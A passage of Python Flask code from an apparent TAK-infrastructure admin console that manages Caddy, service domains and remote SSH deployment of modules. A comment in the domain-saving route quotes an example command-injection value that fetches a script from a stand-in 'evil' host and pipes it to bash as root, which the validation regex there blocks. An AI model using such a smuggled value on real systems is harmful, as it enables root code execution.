        r = subprocess.run(_sudo_wrap(['systemctl', 'stop', 'caddy']), stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, timeout=90)
        return jsonify({'success': r.returncode == 0, 'output': (r.stdout or r.stderr or '').strip()})
    elif action == 'start':
        generate_caddyfile(load_settings())
        subprocess.run(_sudo_wrap(['systemctl', 'enable', 'caddy']), capture_output=True, timeout=5)
        threading.Thread(target=_caddy_restart_after_response, daemon=True).start()
        return jsonify({'success': True, 'output': 'Caddy start scheduled (and enabled for boot); connection may drop briefly.'})
    elif action == 'reload':
        generate_caddyfile(load_settings())
        threading.Thread(target=_caddy_restart_after_response, daemon=True).start()
        return jsonify({'success': True, 'output': 'Caddy restart scheduled; connection may drop briefly.'})
    else:
        return jsonify({'success': False, 'error': 'Unknown action'})

@app.route('/api/caddy/update', methods=['POST'])
@login_required
def caddy_update():
    """Upgrade Caddy to the latest apt package version and reload."""
    try:
        settings = load_settings()
        pkg_mgr = settings.get('pkg_mgr', 'apt')
        if pkg_mgr == 'apt':
            r = _run_priv_chain([['apt-get', 'update', '-qq'], ['apt-get', 'install', '--only-upgrade', '-y', 'caddy']], 'and', timeout=120)
        else:
            r = subprocess.run(
                _sudo_wrap(['dnf', 'upgrade', '-y', 'caddy']), stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, timeout=120)
        if r.returncode != 0:
            return jsonify({'success': False, 'error': (r.stdout or r.stderr or 'Package upgrade failed').strip()})
        # Restart (not reload) — apt replaced the binary; reload only re-reads config and
        # can block indefinitely if Caddy is mid-ACME-challenge (issue #25)
        reload_r = subprocess.run(
            _sudo_wrap(['systemctl', 'restart', 'caddy']), stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, timeout=90)
        return jsonify({'success': True, 'output': (r.stdout or '').strip()})
    except subprocess.TimeoutExpired:
        return jsonify({'success': False, 'error': 'apt-get timed out'})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/api/caddy/uninstall', methods=['POST'])
@login_required
def caddy_uninstall():
    steps = []
    subprocess.run(_sudo_wrap(['systemctl', 'stop', 'caddy']), capture_output=True, timeout=90)
    subprocess.run(_sudo_wrap(['systemctl', 'disable', 'caddy']), capture_output=True, timeout=90)
    steps.append('Stopped and disabled Caddy')
    settings = load_settings()
    pkg_mgr = settings.get('pkg_mgr', 'apt')
    if pkg_mgr == 'apt':
        subprocess.run(_sudo_wrap(['apt-get', 'remove', '--purge', '-y', 'caddy']), capture_output=True, timeout=120)
    else:
        subprocess.run(_sudo_wrap(['dnf', 'remove', '-y', 'caddy']), capture_output=True, timeout=120)
    steps.append('Removed Caddy package')
    for path in ['/usr/bin/caddy', '/usr/local/bin/caddy']:
        if os.path.exists(path):
            try:
                os.remove(path)
            except Exception:
                subprocess.run(f'rm -f {path}', shell=True, capture_output=True)
    if os.path.exists('/etc/caddy'):
        subprocess.run(_sudo_wrap(['rm', '-rf', '/etc/caddy']), capture_output=True, timeout=10)
    subprocess.run(_sudo_wrap(['systemctl', 'daemon-reload']), capture_output=True)
    settings['fqdn'] = ''
    save_settings(settings)
    steps.append('Cleared domain from settings')
    caddy_deploy_log.clear()
    caddy_deploy_status.update({'running': False, 'complete': False, 'error': False})
    return jsonify({'success': True, 'steps': steps})

@app.route('/api/caddy/domains', methods=['GET'])
@login_required
def caddy_get_domains():
    """Return current per-service domains and which services are installed."""
    settings = load_settings()
    modules = detect_modules()
    sd = _get_all_service_domains(settings)
    fqdn = settings.get('fqdn', '')
    services = []
    svc_defs = [
        ('infratak', 'infra-TAK', 'infratak', True),
        ('takserver', 'TAK Server', 'takserver', modules.get('takserver', {}).get('installed', False)),
        ('authentik', 'Authentik', 'authentik', modules.get('authentik', {}).get('installed', False)),
        ('takportal', 'TAK Portal', 'takportal', modules.get('takportal', {}).get('installed', False)),
        ('nodered', 'Node-RED', 'nodered', modules.get('nodered', {}).get('installed', False)),
        ('cloudtak_map', 'CloudTAK Map', 'cloudtak', modules.get('cloudtak', {}).get('installed', False)),
        ('cloudtak_tiles', 'CloudTAK Tiles', 'cloudtak', modules.get('cloudtak', {}).get('installed', False)),
        ('cloudtak_video', 'CloudTAK Video', 'cloudtak', modules.get('cloudtak', {}).get('installed', False)),
        ('mediamtx', 'MediaMTX', 'mediamtx', modules.get('mediamtx', {}).get('installed', False)),
        ('fedhub', 'Federation Hub', 'fedhub', modules.get('fedhub', {}).get('installed', False)),
        ('netbird', 'NetBird', 'netbird', modules.get('netbird', {}).get('installed', False)),
    ]
    for key, label, mod_key, installed in svc_defs:
        setting_key = f'{key}_domain' if key != 'mediamtx' else 'mediamtx_domain'
        custom = settings.get(setting_key, '')
        alias = settings.get(f'{key}_domain_alias', '')
        services.append({
            'key': key, 'label': label, 'domain': sd[key],
            'default': f'{SERVICE_DOMAIN_DEFAULTS[key]}.{fqdn}' if fqdn else '',
            'custom': custom, 'alias': alias, 'installed': installed,
        })
    return jsonify({'fqdn': fqdn, 'services': services})

@app.route('/api/caddy/domains', methods=['POST'])
@login_required
def caddy_save_domains():
    """Save per-service domain overrides (and optional aliases) and regenerate Caddyfile."""
    data = request.get_json() or {}
    domains = data.get('domains', {})
    aliases = data.get('aliases', {})
    settings = load_settings()
    fqdn = settings.get('fqdn', '')
    # Validate every override/alias to the same FQDN/label shape the primary
    # setters enforce (/api/caddy/domain, deploy). Without this a value like
    # `x";curl evil|bash;"` flows verbatim through _get_service_domain into the
    # root-run cert-renewal script (TAK_DOMAIN=…) and executes as root. The
    # charset [a-zA-Z0-9.-] also makes the value shell-metacharacter-free.
    _dom_re = r'^[a-zA-Z0-9][a-zA-Z0-9.-]*[a-zA-Z0-9]$'
    for key in SERVICE_DOMAIN_DEFAULTS:
        setting_key = f'{key}_domain' if key != 'mediamtx' else 'mediamtx_domain'
        alias_key = f'{key}_domain_alias'
        if key in domains:
            val = (domains[key] or '').strip().lower()
            if val and not re.match(_dom_re, val):
                return jsonify({'success': False, 'error': f'Invalid domain/FQDN format for {key}'}), 400
            default_val = f'{SERVICE_DOMAIN_DEFAULTS[key]}.{fqdn}' if fqdn else ''
            if val and val != default_val:
                settings[setting_key] = val
            elif setting_key in settings:
                del settings[setting_key]
        if key in aliases:
            av = (aliases[key] or '').strip().lower()
            if av and not re.match(_dom_re, av):
                return jsonify({'success': False, 'error': f'Invalid alias format for {key}'}), 400
            if av:
                settings[alias_key] = av
            elif alias_key in settings:
                del settings[alias_key]
    save_settings(settings)
    generate_caddyfile(settings)
    threading.Thread(target=_caddy_restart_after_response, daemon=True).start()
    return jsonify({'success': True, 'domains': _get_all_service_domains(settings)})

SERVICE_DOMAIN_DEFAULTS = {
    'infratak': 'infratak',
    'takserver': 'takserver',
    'authentik': 'tak',
    'takportal': 'takportal',
    'nodered': 'nodered',
    'cloudtak_map': 'map',
    'cloudtak_tiles': 'tiles.map',
    'cloudtak_video': 'video',
    'mediamtx': 'stream',
    'tak_video_restreamer': 'stream',
    'fedhub': 'fedhub',
    'cesium_tiles': '3dtiles',
    'webodm': 'webodm',
    'netbird': 'netbird',
    'remote_assist': 'remote',
}

def _get_service_domain(settings, service_key):
    """Get domain for a service: custom override from settings, or default prefix.{fqdn}."""
    setting_key = f'{service_key}_domain' if service_key != 'mediamtx' else 'mediamtx_domain'
    custom = settings.get(setting_key, '').strip()
    if custom:
        if '.' not in custom:
            fqdn = settings.get('fqdn', '').strip()
            return f'{custom}.{fqdn}' if fqdn else custom
        return custom
    fqdn = settings.get('fqdn', '').strip()
    prefix = SERVICE_DOMAIN_DEFAULTS.get(service_key, service_key)
    return f'{prefix}.{fqdn}' if fqdn else ''

def _get_all_service_domains(settings):
    """Return dict of service_key → current domain for all services."""
    return {k: _get_service_domain(settings, k) for k in SERVICE_DOMAIN_DEFAULTS}


def _cloudtak_deployment_defaults():
    """Default CloudTAK deployment config: local by default, optional remote target."""
    return {
        'target_mode': 'local',  # local | remote
        'deployed': False,
        'remote': {
            'host': '',
            'ssh_user': 'root',
            'ssh_port': 22,
            'auth_method': 'ssh_key',  # ssh_key | password
            'ssh_key_path': '',
            'ssh_password': '',
            'os_family': 'ubuntu',
        },
    }


def _normalize_cloudtak_deployment_config(cfg):
    """Validate and normalize CloudTAK deployment settings."""
    c = _deep_merge_dict(_cloudtak_deployment_defaults(), cfg or {})
    mode = (c.get('target_mode') or 'local').strip().lower()
    c['target_mode'] = 'remote' if mode == 'remote' else 'local'
    c['deployed'] = bool(c.get('deployed', False))
    r = c.get('remote', {}) if isinstance(c.get('remote'), dict) else {}
    r['host'] = (r.get('host') or '').strip()
    # Accept both ssh_user/ssh_port (backend canonical) and username/port (UI aliases)
    r['ssh_user'] = (r.get('ssh_user') or r.get('username') or 'root').strip() or 'root'
    try:
        r['ssh_port'] = int((r.get('ssh_port') if r.get('ssh_port') is not None else r.get('port')) or 22)
    except Exception:
        r['ssh_port'] = 22
    auth_method = (r.get('auth_method') or 'ssh_key').strip().lower()
    r['auth_method'] = 'password' if auth_method == 'password' else 'ssh_key'
    r['ssh_key_path'] = (r.get('ssh_key_path') or '').strip()
    r['ssh_password'] = (r.get('ssh_password') or '').strip()
    r['os_family'] = (r.get('os_family') or 'ubuntu').strip().lower() or 'ubuntu'
    # Keep UI aliases present in normalized config for template compatibility
    r['username'] = r['ssh_user']
    r['port'] = r['ssh_port']
    c['remote'] = r
    if c['target_mode'] == 'local':
        c['deployed'] = bool(c.get('deployed', False))
    return c


def _get_cloudtak_deployment_config(settings):
    """Get normalized CloudTAK deployment config from settings."""
    return _normalize_cloudtak_deployment_config(settings.get('cloudtak_deployment', {}))


# ---------------------------------------------------------------------------
# Generic module deployment config (reused by TAK Portal, Authentik,
# MediaMTX, Node-RED — anything that supports local/remote deploy)
# ---------------------------------------------------------------------------

def _module_deployment_defaults():
    """Default deployment config shared by all remote-capable modules."""
    return {
        'target_mode': 'local',
        'deployed': False,
        'remote': {
            'host': '',
            'ssh_user': 'root',
            'ssh_port': 22,
            'auth_method': 'ssh_key',
            'ssh_key_path': '',
            'ssh_password': '',
            'os_family': 'ubuntu',
        },
    }


def _normalize_module_deployment_config(cfg):
    """Validate and normalize deployment settings for any module."""
    c = _deep_merge_dict(_module_deployment_defaults(), cfg or {})
    mode = (c.get('target_mode') or 'local').strip().lower()
    c['target_mode'] = 'remote' if mode == 'remote' else 'local'
    c['deployed'] = bool(c.get('deployed', False))
    r = c.get('remote', {}) if isinstance(c.get('remote'), dict) else {}
    r['host'] = (r.get('host') or '').strip()
    r['ssh_user'] = (r.get('ssh_user') or r.get('username') or 'root').strip() or 'root'
    try:
        r['ssh_port'] = int((r.get('ssh_port') if r.get('ssh_port') is not None else r.get('port')) or 22)
    except Exception:
        r['ssh_port'] = 22
    auth_method = (r.get('auth_method') or 'ssh_key').strip().lower()
    r['auth_method'] = 'password' if auth_method == 'password' else 'ssh_key'
    r['ssh_key_path'] = (r.get('ssh_key_path') or '').strip()
    r['ssh_password'] = (r.get('ssh_password') or '').strip()
    r['os_family'] = (r.get('os_family') or 'ubuntu').strip().lower() or 'ubuntu'
    r['username'] = r['ssh_user']
    r['port'] = r['ssh_port']
    c['remote'] = r
    return c


def _get_module_deployment_config(settings, key):
    """Get normalized deployment config for a module by settings key."""
    return _normalize_module_deployment_config(settings.get(key, {}))


def _takserver_installed_local():
    """True if TAK Server core is installed on THIS host (co-location gate for Federation Hub)."""
    return os.path.exists('/opt/tak') and os.path.exists('/opt/tak/CoreConfig.xml')


def _get_fedhub_deployment_config(settings):
    """fedhub_deployment plus web_ui_port (remote hub web port for Caddy reverse_proxy)."""
    c = _normalize_module_deployment_config(settings.get('fedhub_deployment', {}))
    # v0.9.46: Federation Hub must not co-locate with TAK Server. If TAK Server is on
    # THIS box, a new local deploy is forced to remote. A box with no TAK Server may
    # deploy locally (dedicated FedHub host). Already-deployed hubs are grandfathered.
    if not c.get('deployed') and c.get('target_mode') != 'remote' and _takserver_installed_local():
        c['target_mode'] = 'remote'
    try:
        p = int(c.get('web_ui_port') if c.get('web_ui_port') is not None else 8080)
    except (TypeError, ValueError):
        p = 8080
    c['web_ui_port'] = max(1, min(65535, p))
    return c


def _fedhub_caddy_source_ip(settings):
    """Public IPv4 of the infra-TAK console (Settings → Server IP). Used to UFW-scope Fed Hub web UI ports so only Caddy reaches 8080/9100; peers still use 9101-9103."""
    ip = (settings.get('server_ip') or '').strip()
    if not ip or ip in ('localhost', '127.0.0.1'):
        return None
    parts = ip.split('.')
    if len(parts) != 4:
        return None
    try:
        nums = [int(x) for x in parts]
        if all(0 <= n <= 255 for n in nums):
            return ip
    except ValueError:
        pass
    return None


def _module_deployment_settings_key(module_name):
    """Settings key for a module's deployment config. e.g. 'takportal' -> 'takportal_deployment'."""
    return f'{module_name}_deployment'


def _module_run(deploy_cfg, cmd, timeout=120, log_fn=None):
    """Run a command locally or remotely based on deployment config.

    Returns (ok: bool, output: str).
    """
    if deploy_cfg.get('target_mode') == 'remote':
        remote = deploy_cfg.get('remote', {})
        if log_fn:
            log_fn(f"  [remote] {cmd[:80]}...")
        return _ssh_probe(remote, cmd, timeout=timeout)
    else:
        if log_fn:
            log_fn(f"  [local] {cmd[:80]}...")
        try:
            # v10.0.5 non-root: prepend the broker shim dir to PATH so privileged
            # binaries in this shell string (docker/systemctl/dnf/… and coreutils
            # on privileged paths) route through the root broker. No-op as root /
            # without the broker (shims fall through to the real binary).
            _env = _broker_shim_env()
            # The shims intercept BARE binaries, not a literal `sudo ` prefix — a co-located
            # module command like `sudo ufw …`/`sudo systemctl …` would invoke /usr/bin/sudo
            # and die (takwerx has no sudo). Under the non-root console, strip a leading `sudo `
            # (at a command-segment start) so the bare binary routes through the shim/broker.
            # Preserve `sudo -u X`/`sudo -n …` (run-as-user / gated-remote) — never strip those.
            _cmd = cmd
            if _env is not None:
                _cmd = re.sub(r'(^|[;&|`(]\s*)sudo\s+(?=[^-\s])', r'\1', cmd)
            r = subprocess.run(_cmd, shell=True, capture_output=True, text=True,
                               timeout=timeout, env=_env)
            return r.returncode == 0, (r.stdout or '') + (r.stderr or '')
        except Exception as e:
            return False, str(e)[:200]


def _module_copy(deploy_cfg, local_path, remote_path, timeout=30, log_fn=None):
    """Copy a file locally or remotely based on deployment config.

    Returns (ok: bool, output: str).
    """
    if deploy_cfg.get('target_mode') == 'remote':
        remote = deploy_cfg.get('remote', {})
        if log_fn:
            log_fn(f"  [scp] {os.path.basename(local_path)} -> {remote_path}")
        return _scp_to_host(remote, local_path, remote_path, timeout=timeout)
    else:
        if log_fn:
            log_fn(f"  [copy] {local_path} -> {remote_path}")
        try:
            os.makedirs(os.path.dirname(remote_path), exist_ok=True)
            shutil.copy2(local_path, remote_path)
            return True, 'ok'
        except Exception as e:
            return False, str(e)[:200]


def _register_module_remote_routes(module_name, settings_key, get_config_fn=None):
    """Register generic deployment-config, SSH key, and test routes for a module.

    Creates:
      GET  /api/{module}/deployment-config
      POST /api/{module}/deployment-config
      POST /api/{module}/remote/ensure-ssh-key
      POST /api/{module}/remote/install-ssh-key
      POST /api/{module}/remote/test

    get_config_fn: optional callable(settings) -> dict (e.g. _get_fedhub_deployment_config).
    """
    key_label = f'infra-tak-{module_name}-remote'
    default_key_path = os.path.expanduser(f'~/.ssh/infra-tak-{module_name}')

    def _read_cfg(settings):
        if get_config_fn:
            return get_config_fn(settings)
        return _get_module_deployment_config(settings, settings_key)

    @app.route(f'/api/{module_name}/deployment-config', methods=['GET'], endpoint=f'{module_name}_get_deploy_cfg')
    @login_required
    def get_cfg():
        settings = load_settings()
        return jsonify(_read_cfg(settings))

    @app.route(f'/api/{module_name}/deployment-config', methods=['POST'], endpoint=f'{module_name}_save_deploy_cfg')
    @login_required
    def save_cfg():
        data = request.get_json() or {}
        settings = load_settings()
        base = _read_cfg(settings)
        incoming = data.get('config') or data
        if not isinstance(incoming, dict):
            incoming = {}
        cfg = _normalize_module_deployment_config(_deep_merge_dict(base, incoming))
        settings[settings_key] = cfg
        save_settings(settings)
        settings_after = load_settings()
        out = _read_cfg(settings_after)
        if module_name == 'fedhub' and (settings_after.get('fqdn') or '').strip():
            try:
                generate_caddyfile(settings_after)
                threading.Thread(target=_caddy_restart_after_response, daemon=True).start()
            except Exception:
                pass
        return jsonify(out)

    @app.route(f'/api/{module_name}/remote/ensure-ssh-key', methods=['POST'], endpoint=f'{module_name}_ensure_ssh_key')
    @login_required
    def ensure_key():
        data = request.get_json() or {}
        settings = load_settings()
        cfg = _read_cfg(settings)
        if isinstance(data.get('config'), dict):
            cfg = _normalize_module_deployment_config(_deep_merge_dict(cfg, data['config']))
        rcfg = cfg.get('remote', {})
        kp = (rcfg.get('ssh_key_path') or '').strip() or default_key_path
        kp = os.path.expanduser(kp)
        pub = kp + '.pub'
        if not os.path.exists(kp):
            kdir = os.path.dirname(kp)
            if kdir and not os.path.isdir(kdir):
                os.makedirs(kdir, mode=0o700, exist_ok=True)
            subprocess.run(['ssh-keygen', '-t', 'ed25519', '-N', '', '-f', kp, '-C', key_label],
                           capture_output=True, text=True, timeout=30, check=True)
        fp = ''
        try:
            r = subprocess.run(['ssh-keygen', '-l', '-f', pub], capture_output=True, text=True, timeout=5)
            fp = (r.stdout or '').strip() if r.returncode == 0 else ''
        except Exception:
            pass
        pk = ''
        try:
            with open(pub, 'r') as f:
                pk = f.read().strip()
        except Exception:
            pass
        cfg['remote'] = cfg.get('remote') or {}
        cfg['target_mode'] = 'remote'
        cfg['remote']['ssh_key_path'] = kp
        settings[settings_key] = _normalize_module_deployment_config(cfg)
        save_settings(settings)
        return jsonify({'success': True, 'key_path': kp, 'public_key': pk, 'fingerprint': fp,
                        'config': _read_cfg(load_settings())})

    @app.route(f'/api/{module_name}/remote/install-ssh-key', methods=['POST'], endpoint=f'{module_name}_install_ssh_key')
    @login_required
    def install_key():
        data = request.get_json() or {}
        pwd = (data.get('password') or '').strip()
        if not pwd:
            return jsonify({'success': False, 'error': 'Password is required'}), 400
        settings = load_settings()
        cfg = _read_cfg(settings)
        if isinstance(data.get('config'), dict):
            cfg = _normalize_module_deployment_config(_deep_merge_dict(cfg, data['config']))
        rcfg = cfg.get('remote', {})
        host = rcfg.get('host', '')
        user = rcfg.get('ssh_user', 'root')
        port = rcfg.get('ssh_port', 22)
        kp = (rcfg.get('ssh_key_path') or '').strip() or default_key_path
        kp = os.path.expanduser(kp)
        pub = kp + '.pub'
        if not os.path.exists(pub):
            return jsonify({'success': False, 'error': 'No public key found. Generate one first.'}), 400
        if not host:
            return jsonify({'success': False, 'error': 'Remote host is required'}), 400
        cmd = ['sshpass', '-e', 'ssh-copy-id', '-i', pub,
               '-o', 'StrictHostKeyChecking=accept-new', '-p', str(port), f'{user}@{host}']
        try:
            r = subprocess.run(
                cmd, capture_output=True, text=True, timeout=30,
                env={**os.environ, 'SSHPASS': pwd},
            )
            if r.returncode != 0:
                return jsonify({'success': False, 'error': (r.stderr or r.stdout or 'ssh-copy-id failed')[:400]}), 400
        except Exception as e:
            return jsonify({'success': False, 'error': str(e)[:400]}), 400
        cfg['remote']['ssh_key_path'] = kp
        cfg['remote']['auth_method'] = 'ssh_key'
        cfg['target_mode'] = 'remote'
        settings[settings_key] = _normalize_module_deployment_config(cfg)
        save_settings(settings)
        return jsonify({'success': True, 'message': 'SSH key installed', 'config': _read_cfg(load_settings())})

    @app.route(f'/api/{module_name}/remote/test', methods=['POST'], endpoint=f'{module_name}_test_ssh')
    @login_required
    def test_ssh():
        data = request.get_json() or {}
        settings = load_settings()
        cfg = _read_cfg(settings)
        if isinstance(data.get('config'), dict):
            cfg = _normalize_module_deployment_config(_deep_merge_dict(cfg, data['config']))
        rcfg = cfg.get('remote', {})
        if not rcfg.get('host'):
            return jsonify({'success': False, 'error': 'No remote host configured'}), 400
        test_cmd = 'echo REMOTE_OK && uname -a'
        ok, out = _ssh_probe(rcfg, test_cmd, timeout=15)
        return jsonify({'success': ok, 'output': (out or '')[:500]})


